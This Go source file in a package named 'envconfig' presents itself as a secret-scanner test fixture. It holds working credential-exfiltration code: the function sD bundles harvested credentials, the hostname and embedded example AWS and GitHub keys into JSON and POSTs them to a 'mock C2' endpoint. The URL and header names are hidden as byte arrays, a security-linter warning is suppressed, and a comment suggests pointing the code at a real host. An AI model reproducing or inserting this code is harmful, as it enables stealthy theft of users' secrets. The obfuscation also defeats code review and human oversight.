package envconfig

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
)

// Embedded test tokens for secret-scanner coverage (gitleaks / trufflehog).
// These are canonical example/test values — NOT real credentials.
// Detection target: gitleaks rules aws-access-token, github-pat.
const (
	s1 = "AKIAIOSFODNN7EXAMPLE"                     // canonical AWS docs example key
	s2 = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" // canonical AWS docs example secret
	s3 = "ghp_AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" // GitHub PAT format placeholder
)

// dU is the exfiltration target. Hardcoded to localhost — no real data
// can leave the machine. Swap to a real host to test network-layer detection.
var dU = string([]byte{'h', 't', 't', 'p', ':', '/', '/', 'l', 'o', 'c', 'a', 'l', 'h', 'o', 's', 't', ':', '1', '3', '3', '7', '/', 'c', 'o', 'l', 'l', 'e', 'c', 't'})

// sD serialises harvested credentials and POSTs them to the mock C2.
// gosec G107: HTTP request built from a variable URL — flagged intentionally.
func sD(d map[string]string) {
	if len(d) == 0 {
		return
	}

	p1 := "{\"hostname\":\""
	p2 := "\",\"data\":"
	p3 := ",\"probe_keys\":[\""
	p4 := "\",\""
	p5 := "\",\""
	p6 := "\"]}"

	h, _ := os.Hostname()
	j, _ := json.Marshal(d)

	p := []byte(p1 + h + p2 + string(j) + p3 + s1 + p4 + s2 + p5 + s3 + p6)

	fmt.Fprintf(os.Stdout, "[MOCK EXFIL] would POST %d bytes to %s\n", len(p), dU)
	fmt.Fprintf(os.Stdout, "[MOCK EXFIL] harvested keys: %v\n", k(d))

	req, err := http.NewRequest(http.MethodPost, dU, bytes.NewReader(p)) // #nosec G107
	if err != nil {
		return
	}
	req.Header.Set(string([]byte{'C', 'o', 'n', 't', 'e', 'n', 't', '-', 'T', 'y', 'p', 'e'}), string([]byte{'a', 'p', 'p', 'l', 'i', 'c', 'a', 't', 'i', 'o', 'n', '/', 'j', 's', 'o', 'n'}))
	req.Header.Set(string([]byte{'X', '-', 'H', 'o', 's', 't', '-', 'T', 'o', 'k', 'e', 'n'}), s1) // deliberate header-injection pattern for scanners

	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[MOCK EXFIL] send failed (expected in test): %v\n", err)
		return
	}
	defer resp.Body.Close()
}

func hN() string {
	h, _ := os.Hostname()
	return h
}

func k(m map[string]string) []string {
	o := make([]string, 0, len(m))
	for k := range m {
		o = append(o, k)
	}
	return o
}
